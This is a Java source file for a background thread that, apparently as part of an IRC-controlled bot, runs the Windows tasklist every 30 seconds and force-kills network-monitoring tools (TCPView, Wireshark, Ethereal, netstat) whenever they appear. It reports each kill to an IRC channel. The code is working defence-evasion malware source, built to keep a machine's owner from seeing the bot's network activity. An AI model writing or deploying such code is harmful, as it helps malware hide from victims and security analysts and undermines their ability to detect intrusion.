import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
/**
 * ProcessChecker class, this class checks running processes for any "bad" processes and kills them on run!
 * @author Nathan
 *
 */
public class ProcessChecker extends Thread 
{
	/**
	 * Constructor
	 */
	public ProcessChecker() 
	{
	}
	/**
	 * Checks for processes on a new thread
	 */
	public void run() 
	{
		while(true)
		{
			if(!processCheckingEnabled) {
				break;
			}
	    	String strOutput = "";
	    	String strError = "";
	    	try 
	    	{
	    	Process p = Runtime.getRuntime().exec(new String[]{"cmd", "/c", "tasklist /svc"});
	    	BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));
	    	BufferedReader stdError = new BufferedReader(new InputStreamReader(p.getErrorStream()));
	    	while (strOutput != null) {
	    	if (strOutput.length() < 1) {
	    	} else {
	    		String processName[] = Misc.splitArgs(strOutput);
	    		processList.add(processName[0]);
	    	}
	    	strOutput = stdInput.readLine();
	    	}
	    	strError = stdError.readLine();
	    	if (strError != null) {
	    	while (strError != null) {
	    	IRC.sendMessage(Config.getChannel(), strError);
	    	strError = stdError.readLine();
	    	}
	    	}
	    	} catch (IOException ioe) {
	    	ioe.printStackTrace();
	    	}
	    	check: for (int i = 0; i < badProcess.length; i++) {
		    	if(processList.contains(badProcess[i])) {
		    		CommandExecute exec = new CommandExecute("TASKKILL /f /im "+badProcess[i]);
		    		exec.start();
		    		IRC.sendMessage(Config.getChannel(), "["+badProcess[i]+"] Bad process found, process was killed!");
		    		processList.remove(badProcess[i]);
		    		break check;
		    	}
	    	}
			try {
				Thread.sleep(30000); //Check every 30 seconds to reduce system impact
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}
	
	public static boolean processCheckingEnabled = true;
	private ArrayList<String> processList = new ArrayList<String>();
	private String badProcess[] = new String[]
	                                         {
			"tcpview.exe", "wireshark.exe", "ethereal.exe", "netstat.exe"
	                                         };
}
